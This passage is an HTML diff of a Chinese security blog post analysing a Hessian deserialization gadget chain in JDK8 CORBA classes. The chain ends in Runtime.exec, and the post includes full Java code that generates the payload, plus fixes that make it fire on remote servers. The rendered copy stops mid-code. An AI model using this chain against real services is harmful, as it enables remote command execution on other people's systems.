@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Hessian 反序列化新链分析与坑点 | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="分析一下 Hessian 反序列化新链中的坑点">
+<meta name="author" content="">
+<link rel="canonical" href="https://zoiltin.github.io/posts/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B0%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%9D%91%E7%82%B9/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B0%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%9D%91%E7%82%B9/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B0%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%9D%91%E7%82%B9/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="Hessian 反序列化新链分析与坑点">
+  <meta property="og:description" content="分析一下 Hessian 反序列化新链中的坑点">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-09-23T01:51:35+00:00">
+    <meta property="article:modified_time" content="2025-09-23T01:51:35+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hessian 反序列化新链分析与坑点">
+<meta name="twitter:description" content="分析一下 Hessian 反序列化新链中的坑点">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Hessian 反序列化新链分析与坑点",
+      "item": "https://zoiltin.github.io/posts/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B0%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%9D%91%E7%82%B9/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Hessian 反序列化新链分析与坑点",
+  "name": "Hessian 反序列化新链分析与坑点",
+  "description": "分析一下 Hessian 反序列化新链中的坑点",
+  "keywords": [
+    
+  ],
+  "articleBody": "链子分析 com.sun.corba.se.impl.activation.ServerManagerImpl 类的 getActiveServers 方法代码如下：\npublic int[] getActiveServers() { ServerTableEntry entry; int[] list = null; synchronized (serverTable) { // unlike vectors, list is not synchronized ArrayList servers = new ArrayList(0); Iterator serverList = serverTable.keySet().iterator(); try { while (serverList.hasNext()) { Integer key = (Integer) serverList.next(); // get an entry entry = (ServerTableEntry) serverTable.get(key); if (entry.isValid() \u0026\u0026 entry.isActive()) { servers.add(entry); } } ............. } 调用了 com.sun.corba.se.impl.activation.ServerTableEntry 类的 isValid 方法，代码如下：\nsynchronized boolean isValid(){ if ((state == ACTIVATING) || (state == HELD_DOWN)) { if (debug) printDebug( \"isValid\", \"returns true\" ) ; return true; } try { int exitVal = process.exitValue(); } catch (IllegalThreadStateException e1) { return true; } if (state == ACTIVATED) { if (activateRetryCount \u003c ActivationRetryMax) { if (debug) printDebug(\"isValid\", \"reactivating server\"); activateRetryCount++; activate(); return true; } ................. 其中会判断 process 属性对应的进程是否已经 exited，如果已经 exit 了则进入 activate 方法，代码如下：\nsynchronized void activate() throws org.omg.CORBA.SystemException { state = ACTIVATED; try { if (debug) printDebug(\"activate\", \"activating server\"); process = Runtime.getRuntime().exec(activationCmd); } catch (Exception e) { deActivate(); if (debug) printDebug(\"activate\", \"throwing premature process exit\"); throw wrapper.unableToStartProcess() ; } } 执行了 Runtime#exec 方法。链子中的 Process，ServerTableEntry 等类没有实现 Serializable 接口，所以只能在 Hessian 反序列化中使用。\n链子的入口是 toString + getter ，这里用的是 ConcurrentHashMap 和 jackson, 依赖如下：\ncom.fasterxml.jackson.core jackson-core 2.19.2 com.fasterxml.jackson.core jackson-databind 2.19.2 com.fasterxml.jackson.core jackson-annotations 2.19.2 org.javassist javassist 3.28.0-GA com.caucho hessian 4.0.66 测试代码：\npublic class Main { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\"); CtMethod writeReplace = ctClass0.getDeclaredMethod(\"writeReplace\"); ctClass0.removeMethod(writeReplace); ctClass0.toClass(); ServerManagerImpl serverManager = (ServerManagerImpl) newInstanceWithoutConstructor(ServerManagerImpl.class); ServerTableEntry serverTableEntry = (ServerTableEntry) newInstanceWithoutConstructor(ServerTableEntry.class); HashMap map = new HashMap(); map.put(1,serverTableEntry); Process process = new ProcessBuilder(\"cmd\", \"/c\", \"exit\").start(); setFieldValue(serverManager, \"serverTable\", map); setFieldValue(serverTableEntry, \"process\", process); setFieldValue(serverTableEntry,\"state\",2); setFieldValue(serverTableEntry, \"activationCmd\", \"calc\"); POJONode poJoNode = new POJONode(serverManager); AudioFileFormat.Type t = new AudioFileFormat.Type(null, null); Map finalMap = makeMap(t, poJoNode); byte[] data = ser(finalMap); Files.write(Paths.get(\"ser.bin\"), data); } public static ConcurrentHashMap makeMap ( Object v1, Object v2 ) throws Exception { // v1.equals(v2); Object conEntry1 = newInstanceWithoutConstructor(Class.forName(\"java.util.concurrent.ConcurrentHashMap$MapEntry\")); Object conEntry2 = newInstanceWithoutConstructor(Class.forName(\"java.util.concurrent.ConcurrentHashMap$MapEntry\")); setFieldValue(conEntry1, \"key\", v1); setFieldValue(conEntry1, \"val\", v2); setFieldValue(conEntry2, \"key\", v2); setFieldValue(conEntry2, \"val\", v1); ConcurrentHashMap s = new ConcurrentHashMap(); setFieldValue(s, \"sizeCtl\", 2); Class nodeC; try { nodeC = Class.forName(\"java.util.concurrent.ConcurrentHashMap$Node\"); } catch ( ClassNotFoundException e ) { nodeC = Class.forName(\"java.util.concurrent.ConcurrentHashMap$Entry\"); } Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true); Object tbl = Array.newInstance(nodeC, 2); Array.set(tbl, 0, nodeCons.newInstance(0, conEntry1, conEntry1, null)); Array.set(tbl, 1, nodeCons.newInstance(0, conEntry2, conEntry2, null)); setFieldValue(s, \"table\", tbl); Field table = ConcurrentHashMap.class.getDeclaredField(\"table\"); table.setAccessible(true); table.set(s, tbl); return s; } private static byte[] ser(Object o) throws Exception{ ByteArrayOutputStream bao = new ByteArrayOutputStream(); HessianOutput output = new HessianOutput(bao); output.getSerializerFactory().setAllowNonSerializable(true); output.writeObject(o); return bao.toByteArray(); } private static Object unser(byte[] in) throws Exception{ ByteArrayInputStream bai = new ByteArrayInputStream(in); HessianInput input = new HessianInput(bai); Object o = input.readObject(); return o; } } 测试发现，反序列化过程中会报错。\n坑点分析 上面的链子中使用了 ProcessImpl 作为 Process 实现类，并且是在 Windows 环境下。该类的 exitValue 方法代码如下：\npublic int exitValue() { int exitCode = getExitCodeProcess(handle); if (exitCode == STILL_ACTIVE) throw new IllegalThreadStateException(\"process has not exited\"); return exitCode; } 其中 getExitCodeProcess 方法是 native 方法，在 Windows 下会根据 handle 判断对应的进程是否已经 exited。上面的 POC 中是在生成序列化 Payload 时调用了 new ProcessBuilder().start() 获得了一个 ProcessImpl 实例。所以在实战环境中，受害者服务器与攻击者的机器自然不可能是同一台机器，也更不可能在同一进程下。所以反序列化时无法通过 handle 定位到相应进程，所以爆出了句柄无效的错误：\n这种写法在本地复现时可能能触发成功，但实际上时不能用的。\n这是可以用 Process 的另一个实现类：com.sun.deploy.nativesandbox.IntegrityProcess，该类的 exitValue 方法代码如下：\npublic int exitValue() { return 0; } 直接返回 0，不会进行任何判断也不会报错。\n修改代码为：\nClass ProcessImplClass = Class.forName(\"com.sun.deploy.nativesandbox.IntegrityProcess\"); Process process = (Process) newInstanceWithoutConstructor(ProcessImplClass); 这样生成的序列化 Payload 就可以在远程正常触发了。\n而对于 Linux 环境下直接使用 UNIXProcess 类作为 Process 实现类即可，该类的 exitValue 方法代码如下：\npublic synchronized int exitValue() { if (!hasExited) { throw new IllegalThreadStateException(\"process hasn't exited\"); } return exitcode; } 在生成序列化 Payload 时手动指定 hasExited 属性的值即可。\n这条链子只有在 JDK8 及以下使用，高版本 JDK 把 ServerManagerImpl 等类删除了。\n参考 https://www.n1ght.cn/2025/08/21/blackhat-JDD-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jdk_fastjson%E9%93%BE/\nhttps://xz.aliyun.com/news/18935\n",
+  "wordCount" : "566",
+  "inLanguage": "en",
+  "datePublished": "2025-09-23T01:51:35Z",
+  "dateModified": "2025-09-23T01:51:35Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B0%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%9D%91%E7%82%B9/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zoiltin.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Hessian 反序列化新链分析与坑点
+    </h1>
+    <div class="post-description">
+      分析一下 Hessian 反序列化新链中的坑点
+    </div>
+    <div class="post-meta"><span title='2025-09-23 01:51:35 +0000 UTC'>September 23, 2025</span>&nbsp;·&nbsp;3 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e9%93%be%e5%ad%90%e5%88%86%e6%9e%90" aria-label="链子分析">链子分析</a></li>
+                <li>
+                    <a href="#%e5%9d%91%e7%82%b9%e5%88%86%e6%9e%90" aria-label="坑点分析">坑点分析</a></li>
+                <li>
+                    <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="链子分析">链子分析<a hidden class="anchor" aria-hidden="true" href="#链子分析">#</a></h1>
+<p><code>com.sun.corba.se.impl.activation.ServerManagerImpl</code> 类的 <code>getActiveServers</code> 方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">getActiveServers</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ServerTableEntry entry;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span><span style="color:#f92672">[]</span> list <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">synchronized</span> (serverTable) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// unlike vectors, list is not synchronized</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ArrayList servers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ArrayList(0);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Iterator serverList <span style="color:#f92672">=</span> serverTable.<span style="color:#a6e22e">keySet</span>().<span style="color:#a6e22e">iterator</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> (serverList.<span style="color:#a6e22e">hasNext</span>()) {
+</span></span><span style="display:flex;"><span>                Integer key <span style="color:#f92672">=</span> (Integer) serverList.<span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// get an entry</span>
+</span></span><span style="display:flex;"><span>                entry <span style="color:#f92672">=</span> (ServerTableEntry) serverTable.<span style="color:#a6e22e">get</span>(key);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (entry.<span style="color:#a6e22e">isValid</span>() <span style="color:#f92672">&amp;&amp;</span> entry.<span style="color:#a6e22e">isActive</span>()) {
+</span></span><span style="display:flex;"><span>                    servers.<span style="color:#a6e22e">add</span>(entry);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        .............
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>调用了 <code>com.sun.corba.se.impl.activation.ServerTableEntry</code> 类的 <code>isValid</code> 方法，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isValid</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((state <span style="color:#f92672">==</span> ACTIVATING) <span style="color:#f92672">||</span> (state <span style="color:#f92672">==</span> HELD_DOWN)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (debug)
+</span></span><span style="display:flex;"><span>            printDebug( <span style="color:#e6db74">&#34;isValid&#34;</span>, <span style="color:#e6db74">&#34;returns true&#34;</span> ) ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> exitVal <span style="color:#f92672">=</span> process.<span style="color:#a6e22e">exitValue</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (IllegalThreadStateException e1) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (state <span style="color:#f92672">==</span> ACTIVATED) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (activateRetryCount <span style="color:#f92672">&lt;</span> ActivationRetryMax) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (debug)
+</span></span><span style="display:flex;"><span>                printDebug(<span style="color:#e6db74">&#34;isValid&#34;</span>, <span style="color:#e6db74">&#34;reactivating server&#34;</span>);
+</span></span><span style="display:flex;"><span>            activateRetryCount<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>            activate();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        .................
+</span></span></code></pre></div><p>其中会判断 <code>process</code> 属性对应的进程是否已经 <code>exited</code>，如果已经 <code>exit</code> 了则进入 <code>activate</code> 方法，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">activate</span>() <span style="color:#66d9ef">throws</span> org.<span style="color:#a6e22e">omg</span>.<span style="color:#a6e22e">CORBA</span>.<span style="color:#a6e22e">SystemException</span> {
+</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> ACTIVATED;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (debug)
+</span></span><span style="display:flex;"><span>            printDebug(<span style="color:#e6db74">&#34;activate&#34;</span>, <span style="color:#e6db74">&#34;activating server&#34;</span>);
+</span></span><span style="display:flex;"><span>        process <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(activationCmd);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>        deActivate();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (debug)
+</span></span><span style="display:flex;"><span>            printDebug(<span style="color:#e6db74">&#34;activate&#34;</span>, <span style="color:#e6db74">&#34;throwing premature process exit&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> wrapper.<span style="color:#a6e22e">unableToStartProcess</span>() ;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>执行了 <code>Runtime#exec</code> 方法。链子中的 <code>Process</code>，<code>ServerTableEntry</code> 等类没有实现 <code>Serializable</code> 接口，所以只能在 <code>Hessian</code> 反序列化中使用。</p>
+<p>链子的入口是 <code>toString + getter</code> ，这里用的是 <code>ConcurrentHashMap</code> 和 <code>jackson</code>, 依赖如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependencies&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;artifactId&gt;</span>jackson-core<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;version&gt;</span>2.19.2<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;artifactId&gt;</span>jackson-databind<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;version&gt;</span>2.19.2<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;artifactId&gt;</span>jackson-annotations<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;version&gt;</span>2.19.2<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;groupId&gt;</span>org.javassist<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;artifactId&gt;</span>javassist<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;version&gt;</span>3.28.0-GA<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;groupId&gt;</span>com.caucho<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;artifactId&gt;</span>hessian<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;version&gt;</span>4.0.66<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependencies&gt;</span>
+</span></span></code></pre></div><p>测试代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass ctClass0 <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;com.fasterxml.jackson.databind.node.BaseJsonNode&#34;</span>);
+</span></span><span style="display:flex;"><span>        CtMethod writeReplace <span style="color:#f92672">=</span> ctClass0.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;writeReplace&#34;</span>);
+</span></span><span style="display:flex;"><span>        ctClass0.<span style="color:#a6e22e">removeMethod</span>(writeReplace);
+</span></span><span style="display:flex;"><span>        ctClass0.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ServerManagerImpl serverManager <span style="color:#f92672">=</span> (ServerManagerImpl) newInstanceWithoutConstructor(ServerManagerImpl.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        ServerTableEntry serverTableEntry <span style="color:#f92672">=</span> (ServerTableEntry) newInstanceWithoutConstructor(ServerTableEntry.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(1,serverTableEntry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Process process <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#e6db74">&#34;cmd&#34;</span>, <span style="color:#e6db74">&#34;/c&#34;</span>, <span style="color:#e6db74">&#34;exit&#34;</span>).<span style="color:#a6e22e">start</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(serverManager, <span style="color:#e6db74">&#34;serverTable&#34;</span>, map);
+</span></span><span style="display:flex;"><span>        setFieldValue(serverTableEntry, <span style="color:#e6db74">&#34;process&#34;</span>, process);
+</span></span><span style="display:flex;"><span>        setFieldValue(serverTableEntry,<span style="color:#e6db74">&#34;state&#34;</span>,2);
+</span></span><span style="display:flex;"><span>        setFieldValue(serverTableEntry, <span style="color:#e6db74">&#34;activationCmd&#34;</span>, <span style="color:#e6db74">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        POJONode poJoNode <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> POJONode(serverManager);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        AudioFileFormat.<span style="color:#a6e22e">Type</span> t <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AudioFileFormat.<span style="color:#a6e22e">Type</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Map finalMap <span style="color:#f92672">=</span> makeMap(t, poJoNode);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> ser(finalMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Files.<span style="color:#a6e22e">write</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;ser.bin&#34;</span>), data);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> ConcurrentHashMap <span style="color:#a6e22e">makeMap</span> ( Object v1, Object v2 ) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// v1.equals(v2);</span>
